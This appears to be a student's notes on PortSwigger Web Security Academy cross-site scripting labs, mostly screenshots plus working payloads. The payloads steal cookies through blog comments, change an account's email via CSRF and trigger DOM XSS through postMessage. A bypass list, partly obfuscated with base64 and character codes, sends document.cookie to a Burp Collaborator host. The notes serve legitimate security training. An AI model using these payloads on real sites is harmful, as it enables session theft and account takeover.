![](../../../../.gitbook/assets/mediaa88a97e2-a4bf-4544-b31f-daca109cb523.png)

![](../../../../.gitbook/assets/media623970c8-9fdc-4b96-bc29-a7754659e6bd.png)

![](../../../../.gitbook/assets/media02e26dbd-b56d-4990-ba58-9164a150f5d2.png)

* The source code has form tags, but the type is hidden and the name is csrf and the value is the ID: `Dqeo31Ds5I7WnZN9za1sgJI0d9EKf4A3`

![](../../../../.gitbook/assets/media1e39a39c-0366-48c4-b3e4-43d88efadb1b.png)

![](../../../../.gitbook/assets/mediaef154165-9417-4654-af86-bdab8cec3a28.png)

### Code for getting the cookie

```html
<script>
windows.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();
data.append('csrf', token );
data.append('postId' , 5 );
data.append('comment' , document.cookie);
data.append('name ', 'shadow');
data.append('email', 'shadow@gmail');
data.append('website' , 'https://rhanihasan.com');
fetch('/post/comment' ,{ method: 'POST' mode: 'no-cors' body: data});
});
</script>
```

Or with the collaborator:

![](../../../../.gitbook/assets/mediaae9404a3-6f2b-4ecb-a8ab-d787a71be4a3.png)

![](../../../../.gitbook/assets/media742a2655-7fb6-4058-a8ad-d07c75e5eb52.png)

* Go to Home tab and refresh.
* Paste the Session ID.

![](../../../../.gitbook/assets/media60fdd076-c654-4e0f-8507-4fcee7dda79e.png)

![](../../../../.gitbook/assets/mediaa26de589-9709-4777-995e-af48f39d6662.png)

Exploiting cross-site scripting to steal cookies

![](../../../../.gitbook/assets/media5fad2199-38ed-4c37-a32c-dd0a2d97b7e3.png)

![](../../../../.gitbook/assets/mediafcce1d91-5672-4d51-94a5-36cf2d2da1b5.png)

![](../../../../.gitbook/assets/media085d1e6f-afb7-449b-a782-13490ef577db.png)

![](../../../../.gitbook/assets/media149c3561-d2b8-46a1-afb8-3e35b093cfe5.png)

## Exploiting cross-site scripting to capture passwords

![](../../../../.gitbook/assets/mediae0fdcbdf-9cfa-4b13-9d85-0d3c189f6a47.png)

![](../../../../.gitbook/assets/mediaee1d3135-5c8e-4aa0-b069-0165bb24b3d5.png)

## Exploiting XSS to perform CSRF

* Login with the given account.

![](../../../../.gitbook/assets/media08e0c996-09bd-4ecd-a532-24894a16c674.png)

![](../../../../.gitbook/assets/media83e2289c-efef-492c-8234-42df82af12e2.png)

![](../../../../.gitbook/assets/media67ed8a27-f38a-474b-a210-92c678d9f7a9.png)

![](../../../../.gitbook/assets/media3f8d015b-d386-4685-812f-ae4f68148bdb.png)

![](../../../../.gitbook/assets/media35ce4fc8-7bd6-4500-8f50-2af01ab47e8c.png)

![](../../../../.gitbook/assets/media2a2e1c40-d907-4224-a704-fc3da3837b77.png)

* There is a CSRF token which secure the account.

![](../../../../.gitbook/assets/media9d8660a0-1538-467e-82a7-db9514c699eb.png)

![](../../../../.gitbook/assets/mediac2c9a621-f77a-42c6-a39e-25c1fd5d9f5a.png)

* The malicious code gets the csrf in the comment box.

### Code

```html
<script>
window.addEventListener('DOMContentLoaded' , function(){
  var token = document.getElementsByName('csrf')[0].value;
  var data = new FormData();
  data.append('csrf' , token )
  data.append('email' , 'shadow@gmail.com');
  fetch('/my-account/change-email' ,{
    method:'POST',
    mode:'no-cors',
    body : data
  });
});
</script>
```

## DOM XSS using web messages

The source code:

![](../../../../.gitbook/assets/media3f82c66e-b9ba-4192-9e90-f4ee45a1fb5d.png)

* Whenever a message is sent to the window, an element of the DOM is changed.
* To send a message, I need to access the lab application's window object.
* However, I cannot directly inject a `<script>` tag as the victim page's script parsing has already finished.
* To run my script, I must include it in a way that it runs while the page is being rendered, such as in the onerror property of an `<img>` tag.
* The `postMessage()` method allows secure cross-origin communication between Window objects, such as between a page and a pop-up it created or between a page and an embedded iframe.
* The events can be `onload`, `onerror` etc. After the error, the print prompt will occur which validates the malicious code works.

### Code

```html
<iframe src="https://0ade00db03e2650186b97b1200c800b6.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','https://0ade00db03e2650186b97b1200c800b6.web-security-academy.net')">
```

## DOM XSS using web messages and a JavaScript URL

* In this, the source is being verified.

![](../../../../.gitbook/assets/mediae47ea841-b3ea-4a1f-b87b-627f19177fa7.png)

## Some Useful Bypasses

```html
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt >
```

Can be interpreted as:

```html
</ScRiPt ><ScRiPt >document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />');</ScRiPt >
```

Can be interpreted as:

```html
</ScRiPt ><ScRiPt >document.write(String.fromCharCode(60, 105, 109, 103, 32, 115, 114, 99, 61, 34, 104, 116, 116, 112, 58, 47, 47, 99, 51, 103, 102, 112, 53, 55, 56, 121, 56, 107, 51, 54, 109, 98, 102, 56, 112, 113, 120, 54, 113, 99, 50, 110, 116, 116, 107, 104, 97, 53, 122, 46, 111, 97, 115, 116, 105, 102, 121, 46, 99, 111, 109, 63, 99, 61) + document.cookie + String.fromCharCode(34, 32, 47, 62, 60, 47, 83, 99, 114, 105, 112, 116, 62));
```

```
"-alert(window["document"]["cookie"])-""-window["alert"](window["document"]["cookie"])-"
```

```
"-self["alert"](self["document"]["cookie"])-"
```

```
"+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```

## References

* [https://github.com/s0md3v/AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://github.com/R0X4R/D4rkXSS](https://github.com/R0X4R/D4rkXSS)
* [https://github.com/R0X4R/D4rkXSS](https://github.com/R0X4R/D4rkXSS)
* [https://gist.github.com/t-artistik/9f36e9de2baf9ac72f0f](https://gist.github.com/t-artistik/9f36e9de2baf9ac72f0f)
* [https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md)
* [https://github.com/ihebski/XSS-Payloads](https://github.com/ihebski/XSS-Payloads)
* [https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/README.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/README.md)
